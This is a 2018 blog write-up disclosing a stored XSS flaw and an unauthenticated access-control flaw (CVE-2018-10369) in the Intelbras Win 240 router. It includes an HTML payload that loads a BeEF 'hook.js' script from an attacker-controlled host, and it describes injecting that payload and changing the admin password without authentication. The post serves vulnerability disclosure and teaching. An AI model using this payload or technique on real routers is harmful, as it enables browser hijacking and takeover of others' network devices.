=== Content from medium.com_a72c8ae3_20250124_200728.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F4d0e7fcfbd9e&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40julianpedrobraga%2Frouter-hacking-destrinchando-o-elo-mais-fraco-de-uma-rede-4d0e7fcfbd9e&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40julianpedrobraga%2Frouter-hacking-destrinchando-o-elo-mais-fraco-de-uma-rede-4d0e7fcfbd9e&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Router Hacking: Intelbras Win 240 V1.1.0

[![Julian Pedro Braga](https://miro.medium.com/v2/resize:fill:88:88/0*GHFBY3MLzr8nDGz0.)](/%40julianpedrobraga?source=post_page---byline--4d0e7fcfbd9e--------------------------------)

[Julian Pedro Braga](/%40julianpedrobraga?source=post_page---byline--4d0e7fcfbd9e--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fc4c397bb459e&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40julianpedrobraga%2Frouter-hacking-destrinchando-o-elo-mais-fraco-de-uma-rede-4d0e7fcfbd9e&user=Julian+Pedro+Braga&userId=c4c397bb459e&source=post_page-c4c397bb459e--byline--4d0e7fcfbd9e---------------------post_header-----------)

5 min read·Apr 25, 2018

--

1

Share

![]()
# Introduction

One of the most common faults committed by web developers in recent times is Cross Site Scripting (XSS), to the detriment of that, several applications retains this failure, among them devices like routers and switches are one of the most affected. This article aims to demonstrate two flaws found in the Intelbras Win 240 V1.1.0 router.

# Hack The Planet

Recently during my security tests *for purely educational purposes* I considered trying to find some vulnerability in my router, after several attempts and a few hours of searching I ended up discovering a “persistent Xss” failure in one of the administration pages, and to my surprise I discovered another failure even more critical, come on I’ll show you how I managed to compromise this device.

# Discovering the Failure

To find anything first, I need to search, and in the hacking is no different, I started my search by manually testing all the parameters that I saw in front of, in that case, the application blocked the number of characters inserted in each field, making it impossible to insert my payload, besides of converting the data to hexadecimal before they are processed, however that is not a problem. After encoding the payload to hexadecimal, I made the request passing the payload directly into the burp suite and XSS Storange detected!

![]()

Inserting the payload in the application

![]()

Application running payload

Honestly the moment the application ran the payload I was extremely surprised, did not believe my router was vulnerable, and that’s the big problem, most of the time the home networks have vulnerable routers with known and unknown faults as is the case, but this is not only, this hack ends with a much more interesting discovery.

After having found the XSS Storange I did not content myself with running a simple alert (“XSS”), I needed a more intriguing PoC and in a few seconds I had an idea, to join that XSS Storange fault with Beef XSS.

![]()

Planning

Using Beef XSS is very simple, all known pentest distributions have the same by default, so it is only necessary to start it, in which case I used Kali Linux. With Beef-Xss started it’s time to make the web application run the malicious javascript code of the beef and to simplify this process, I made a page in html that ran the “hook.js” script of the beef, so just exploring the Xss Storange of the router using this technique.

> Page we use payload:
>
> <html>
> <script src=’[http://10.0.0.102:3000/hook.js'](http://10.0.0.102:3000/hook.js%27)></script>
> <img src=’[http://10.0.0.102/bob.gif'](http://10.0.0.102/bob.gif%27)>
> </html>

At this point, just carry out the attack in the same way that we run that simple alert (“XSS”), but this time I’ll use a different tag. With the burp open and intercepting the communication I inject the payload.

![]()

Payload Injected

Now that the application is pulling the malicious script from our page, when a user enters that section of the router the script will be executed and we will gain the hook in the user’s browser which in case is the victim.

![]()

Browser running malicious script

From here I was already happy with the exploration and I was already writing part of this article, however I realized that it did not make so much sense this attack, yes the XSS is a fault that must be taken seriously and carries a great risk as shown in PoC above, however I had to be logged in as an administrator to then exploit the vulnerability. It was there that I had a simple and somewhat banal idea, had no hope that would work and be part of a second discovery.

# From one failure to another

We all know that in the exploration shown, the requests were being intercepted by the burp suite, modified and then sent to the web page, so the requests were made by passing the authentication cookie. And that was the reason that made me “tweak” a little more, I thought to myself if I did not have a way to make the requests without being authenticated, because thus an unauthenticated attacker could exploit the vulnerability, what I did was very simple, make the request with the authentication cookie I removed the request from all the information that was related to cookie and session, that is, I made a request without any authentication, of course without any hope that it worked, but to my surprise the router accepted the request and so I was able to exploit XSS without being authenticated through an Incorrect Access Control failure, my reaction was very similar to the gif below:

![]()

My reaction

In the image below it is possible to see the “pure” request being made without any type of authentication and the router accepting it.

![]()

Request made without authentication

From that moment I was somewhat more satisfied, because now the exploration had a different meaning and could be made by any user of this network, though this is not only, while I analyzed the situation I had another idea, since the router accepted the XSS payload insertion request, I’m going to make a request for a password change without being authenticated and that’s where the thing got more interesting, because as in the above demonstration the router accepted. To facilitate the exploration I made a python exploit, which, when running, asks for a new password and performs the password change automatically.

![]()

Exploit Python

I hope you have understood my purpose with this article, however much an application has a certain level of security nothing is completely safe, we are entering the stage of IoT devices and those are the ones with the most vulnerabilities like these or even more critical.

![]()

***Obs: The demonstrations here are purely for educational purposes, no other device has been compromised.***

Att:

CVE attributed to failure of Incorrect Access Control: CVE-2018–10369.

[Hacking](/tag/hacking?source=post_page-----4d0e7fcfbd9e--------------------------------)[Xss Attack](/tag/xss-attack?source=post_page-----4d0e7fcfbd9e--------------------------------)[Router](/tag/router?source=post_page-----4d0e7fcfbd9e--------------------------------)[Bugs](/tag/bugs?source=post_page-----4d0e7fcfbd9e--------------------------------)

--

--

1

[![Julian Pedro Braga](https://miro.medium.com/v2/resize:fill:96:96/0*GHFBY3MLzr8nDGz0.)](/%40julianpedrobraga?source=post_page---post_author_info--4d0e7fcfbd9e--------------------------------)[![Julian Pedro Braga](https://miro.medium.com/v2/resize:fill:128:128/0*GHFBY3MLzr8nDGz0.)](/%40julianpedrobraga?source=post_page---post_author_info--4d0e7fcfbd9e--------------------------------)Follow[## Written by Julian Pedro Braga](/%40julianpedrobraga?source=post_page---post_author_info--4d0e7fcfbd9e--------------------------------)[8 Followers](/%40julianpedrobraga/followers?source=post_page---post_author_info--4d0e7fcfbd9e--------------------------------)·[45 Following](/%40julianpedrobraga/following?source=post_page---post_author_info--4d0e7fcfbd9e--------------------------------)Follow
## Responses (1)

See all responses[Help](https://help.medium.com/hc/en-us?source=post_page-----4d0e7fcfbd9e--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----4d0e7fcfbd9e--------------------------------)[About](/about?autoplay=1&source=post_page-----4d0e7fcfbd9e--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----4d0e7fcfbd9e--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----4d0e7fcfbd9e--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----4d0e7fcfbd9e--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----4d0e7fcfbd9e--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----4d0e7fcfbd9e--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----4d0e7fcfbd9e--------------------------------)[Teams](/business?source=post_page-----4d0e7fcfbd9e--------------------------------)


